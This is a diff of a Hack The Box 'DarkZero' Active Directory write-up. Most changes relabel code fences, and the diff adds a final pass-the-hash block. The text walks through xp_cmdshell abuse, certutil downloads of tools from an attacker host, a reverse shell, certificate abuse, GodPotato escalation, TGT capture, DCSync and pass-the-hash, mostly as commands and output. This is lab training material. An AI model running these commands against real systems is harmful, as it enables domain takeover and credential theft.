@@ -8,7 +8,7 @@ categories: [writeup]
 As is common in real life pentests, you will start the DarkZero box with credentials for the following account `john.w / RFulUtONCOL!`
 # Nmap Scan
 ### DC01.darkzero.htb
-```
+```bash
 PORT     STATE SERVICE       VERSION
 53/tcp   open  domain        Simple DNS Plus
 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-17 22:04:17Z)
@@ -79,7 +79,7 @@ Host script results:
 |_    Message signing enabled and required
 ```
 ### DC02.darkzero.ext
-```
+```bash
 PORT     STATE SERVICE       VERSION
 53/tcp   open  domain        Simple DNS Plus
 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-17 22:53:41Z)
@@ -151,7 +151,7 @@ Host script results:
 ```
 # Initial Enumeration
 Authenticating to the MSSQL instance using the provided domain credentials via `impacket-mssqlclient`.
-```
+```bash
 ~/HTB/Windows/DarkZero $ mssqlclient.py inlanefreight.local/john.w:'RFulUtONCOL!'@DC01 -windows-auth
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
@@ -166,7 +166,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 SQL (darkzero\john.w  guest@master)>
 ```
 Upon successful login, I proceeded to enumerate impersonation privileges, databases, and linked servers.
-```
+```bash
 SQL (darkzero\john.w  guest@master)> enum_impersonate
 execute as   database   permission_name   state_desc   grantee   grantor
 ----------   --------   ---------------   ----------   -------   -------
@@ -189,13 +189,13 @@ Linked Server       Local Login       Is Self Mapping   Remote Login
 DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc
 ```
 The results revealed a link to `DC02.darkzero.ext`, confirming we are within an `AD Forest`. Let's pivot to this linked server!
-```
+```bash
 SQL (darkzero\john.w  guest@master)> use_link "DC02.darkzero.ext"
 SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)>
 ```
 # Initial Foothold
 Since `dc01_sql_svc` is `dbo`, we can enable `xp_cmdshell` to execute system commands and obtain an initial foothold on `DC02`. 
-```
+```bash
 SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> enable_xp_cmdshell
 INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
 INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
@@ -204,7 +204,7 @@ SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell whoami
 darkzero-ext\svc_sql
 ```
 Initial enumeration reveals no immediate high-level privileges. However, a discovered policy backup indicates that `svc_sql` is granted `SeImpersonatePrivlege`. While this allows for `Potato`-style elevation, the privilege is currently unavailable because our `MSSQL` session is restricted to `Logon Type 3 (Network)`.
-```
+```bash
 SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell whoami /priv
 PRIVILEGES INFORMATION
 ----------------------
@@ -229,13 +229,13 @@ NT AUTHORITY\SERVICE                       Well-known group S-1-5-6             
 ```
 To obtain fully functional interactive session, we need an alternative login method. First, let's establish a tunnel to `DC02` to further our investigation.
 Upload the `Ligolo-ng` agent to `DC02` and initiate a connection back to the proxy on our attack machine.
-```
+```bash
 SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell certutil -urlcache -f http://10.10.15.12/agent.exe C:\Users\Public\agent.exe
 ****  Online  ****
 CertUtil: -URLCache command completed successfully.
 ```
 
-```
+```bash
 ~/Ligolo-ng $ sudo ligolo-ng-proxy -selfcert
 INFO[0000] Loading configuration file ligolo-ng.yaml
 WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!
@@ -244,11 +244,11 @@ INFO[0000] Listening on 0.0.0.0:11601
 ligolo-ng »
 ```
 
-```
+```bash
 SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell C:\Users\Public\agent.exe -connect 10.10.15.12:11601 -ignore-cert
 ```
 
-```
+```bash
 ligolo-ng » INFO[0153] Agent joined.                                 id=00155df25c01 name="darkzero-ext\\svc_sql@DC02" remote="10.129.13.92:63277"
 ligolo-ng » session
 ? Specify a session : 1 - darkzero-ext\svc_sql@DC02 - 10.129.13.92:63277 - 00155df25c01
@@ -276,13 +276,13 @@ INFO[0170] Starting tunnel to darkzero-ext\svc_sql@DC02 (00155df25c01)
 └──────────────┴───────────────────────────────┘
 ```
 Routing the target subnet through our tunnel interface. 
-```
+```bash
 ~/HTB/Windows/DarkZero $ sudo ip route add 172.16.20.0/24 dev ligolo
 ```
 # Compromise darkzero.ext
 To further enumerate `DC02`, we require a valid domain account. Since we currently have an `MSSQL` session as `svc_sql` and `ADCS` is active on target, we can leverage the `Pass-the-Certificate` technique to retrieve the `NT` hash for `svc_sql`.
 Verified the `CA` details using `certutil`.
-```
+```bash
 SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell certutil -CA
   Name: Active Directory Enrollment Policy
   Id: {844CD2CE-3519-4A0D-AB8D-F20742C6DBEC}
@@ -307,7 +307,7 @@ SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell certutil -CA
 <SNIP>
 ```
 Uploaded `Certify.exe` to `DC02` and requested a certificate using the `User` template.
-```
+```bash
 SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell certutil -urlcache -f http://10.10.15.12/Certify.exe C:\Users\Public\Certify.exe
 ****  Online  ****
 CertUtil: -URLCache command completed successfully.
@@ -344,13 +344,13 @@ SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell C:\Users\Public
 [*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 ```
 Converted the issued certificate (`.pem`) into a `.pfx` file on the attack machine.
-```
+```bash
 ~/HTB/Windows/DarkZero $ openssl pkcs12 -in svc_sql.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out svc_sql.pfx
 Enter Export Password:
 Verifying - Enter Export Password:
 ```
 Authenticated using `Certipy` to obtain the `NT` hash for `svc_sql`.
-```
+```bash
 ~/HTB/Windows/DarkZero $ certipy auth -dc-ip 172.16.20.2 -pfx svc_sql.pfx
 [*] Certificate identities:
 [*]     SAN UPN: 'svc_sql@darkzero.ext'
@@ -365,7 +365,7 @@ Authenticated using `Certipy` to obtain the `NT` hash for `svc_sql`.
 ```
 Since `svc_sql` is not a member of the `Remote Management Users` group, we cannot gain a full interactive shell directly. We need cleartext credentials to trigger a `Logon Type 5 (Service)` session using `RunasCs`, which will grant us the necessary privileges.
 Used `impacket-changepasswd` with the recovered `NT` hash to set the `svc_sql` password to `Password123`.
-```
+```bash
 ~/HTB/Windows/DarkZero $ changepasswd.py darkzero.ext/svc_sql@DC02 -hashes :816ccb849956b531db139346751db65f
 New password:
 Retype new password:
@@ -374,25 +374,25 @@ Retype new password:
 [*] Password was changed successfully.
 ```
 Uploaded `RunasCs.exe` to `DC02`.
-```
+```bash
 SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell certutil -urlcache -f http://10.10.15.12/RunasCs.exe C:\Users\Public\RunasCs.exe
 ****  Online  ****
 CertUtil: -URLCache command completed successfully.
 ```
 Started a listener on attack machine.
-```
+```bash
 ~/HTB/Windows/DarkZero $ rlwrap nc -lvnp 4444
 Listening on 0.0.0.0 4444
 ```
 Executed `RunasCs` to bypass `UAC` and initiate a reverse shell.
-```
+```bash
 SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell C:\Users\Public\RunasCs.exe svc_sql Password123 cmd.exe -l 5 --bypass-uac -r 10.10.15.12:4444
 [+] Running in session 0 with process function CreateProcessWithLogonW()
 [+] Using Station\Desktop: Service-0x0-29288$\Default
 [+] Async process 'C:\Windows\system32\cmd.exe' with pid 1256 created in background.
 ```
 
-```
+```powershell
 Connection received on 10.129.13.92 63224
 Microsoft Windows [Version 10.0.20348.2113]
 (c) Microsoft Corporation. All rights reserved.
@@ -412,7 +412,7 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ```
 Leveraged `GodPotato` to abuse the impersonation privilege and add `svc_sql` to the local `Administrators` group.
-```
+```powershell
 C:\Users\Public>certutil -urlcache -f http://10.10.15.12/GodPotato-NET4.exe GodPotato-NET4.exe
 ****  Online  ****
 CertUtil: -URLCache command completed successfully.
@@ -446,7 +446,7 @@ C:\Users\Public>.\GodPotato-NET4.exe -cmd "cmd /c net localgroup administrators 
 The command completed successfully.
 ```
 Verified administrative access and retrieved the user flag.
-```
+```bash
 ~/HTB/Windows/DarkZero $ nxc smb DC02 -u svc_sql -p Password123 -x "type C:\Users\Administrator\Desktop\user.txt"
 SMB         172.16.20.2     445    DC02             [*] Windows Server 2022 Build 20348 x64 (name:DC02) (domain:darkzero.ext) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         172.16.20.2     445    DC02             [+] darkzero.ext\svc_sql:Password123 (Pwn3d!)
@@ -455,14 +455,14 @@ SMB         172.16.20.2     445    DC02             5b8a00d65a93b99d0bf39ce840c5
 ```
 # Compromise darkzero.htb
 Enumeration via `NetExec` confirmed that the `DC02$` computer account is `Trusted for Delegation (Unconstrained)`. This configuration allows us to intercept the `TGT` of any user who authenticates to `DC02`.
-```
+```bash
 ~/HTB/Windows/DarkZero $ nxc ldap DC02 -u svc_sql -p Password123 --trusted-for-delegation
 LDAP        172.16.20.2     389    DC02             [*] Windows Server 2022 Build 20348 (name:DC02) (domain:darkzero.ext) (signing:None) (channel binding:Never)
 LDAP        172.16.20.2     389    DC02             [+] darkzero.ext\svc_sql:Password123
 LDAP        172.16.20.2     389    DC02             DC02$
 ```
 Establish a `SYSTEM` shell on `DC02` using `impacket-psexec`.
-```
+```bash
 ~/HTB/Windows/DarkZero $ psexec.py darkzero.ext/svc_sql:Password123@DC02
 Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
 
@@ -479,7 +479,7 @@ Microsoft Windows [Version 10.0.20348.2113]
 C:\Windows\system32>
 ```
 Uploaded and launched `Rubeus.exe` in monitor mode with a 5-second interval.
-```
+```powershell
 C:\Users\Public> certutil -urlcache -f http://10.10.15.12/Rubeus.exe Rubeus.exe
 ****  Online  ****
 CertUtil: -URLCache command completed successfully.
@@ -489,13 +489,13 @@ C:\Users\Public> .\Rubeus.exe monitor /interval:5 /nowrap
 [*] Monitoring every 5 seconds for new TGTs
 ```
 From the `DC01` `MSSQL` session, I executed `xp_dirtree` pointing to the `DC02` UNC path. This forced `DC01` to authenticate to `DC02`, catching its `TGT` in memory.
-```
+```bash
 SQL (darkzero\john.w  guest@master)> xp_dirtree \\DC02.darkzero.ext\c$
 subdirectory   depth   file
 ------------   -----   ----
 ```
 `Rubeus` successfully intercepted the `Base64` encoded `TGT` for `DC01$`.
-```
+```powershell
 <SNIP>
 [*] 4/3/2026 7:00:12 AM UTC - Found new TGT:
 
@@ -509,7 +509,7 @@ subdirectory   depth   file
 <SNIP>
 ```
 Decoded ticket and converted the `.kirbi` file to `.ccache` using `impacket-ticketConverter`.
-```
+```bash
 ~/HTB/Windows/DarkZero $ echo "<SNIP>" | base64 -d > dc01.kirbi
 
 ~/HTB/Windows/DarkZero $ ticketConverter.py dc01.kirbi dc01.ccache
@@ -517,7 +517,7 @@ Decoded ticket and converted the `.kirbi` file to `.ccache` using `impacket-tick
 [+] done
 ```
 Exported the captured ticket to `KRB5CCNAME` environment variable and performed a `DCSync` against `DC01`.
-```
+```bash
 ~/HTB/Windows/DarkZero $ export KRB5CCNAME=dc01.ccache
 
 ~/HTB/Windows/DarkZero $ secretsdump.py DC01 -k -no-pass -just-dc-user Administrator
@@ -533,6 +533,13 @@ Administrator:0x17:5917507bdf2ef2c2b0a869a1cba40726
 [*] Cleaning up...
 ```
 Using the `Administrator`'s hash, I executed a `Pass-the-Hash` attack to retrieve the root flag.
+```bash
+~/HTB/Windows/DarkZero $ nxc smb DC01 -u Administrator -H 5917507bdf2ef2c2b0a869a1cba40726 -x "type C:\Users\Administrator\Desktop\root.txt"
+SMB         10.129.13.92    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.13.92    445    DC01             [+] darkzero.htb\Administrator:5917507bdf2ef2c2b0a869a1cba40726 (Pwn3d!)
+SMB         10.129.13.92    445    DC01             [+] Executed command via wmiexec
+SMB         10.129.13.92    445    DC01             70bba28ca33281cc5acba9a856ebd8a6
+```
 ```
 ~/HTB/Windows/DarkZero $ nxc smb DC01 -u Administrator -H 5917507bdf2ef2c2b0a869a1cba40726 -x "type C:\Users\Administrator\Desktop\root.txt"
 SMB         10.129.13.92    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:None) (Null Auth:True)
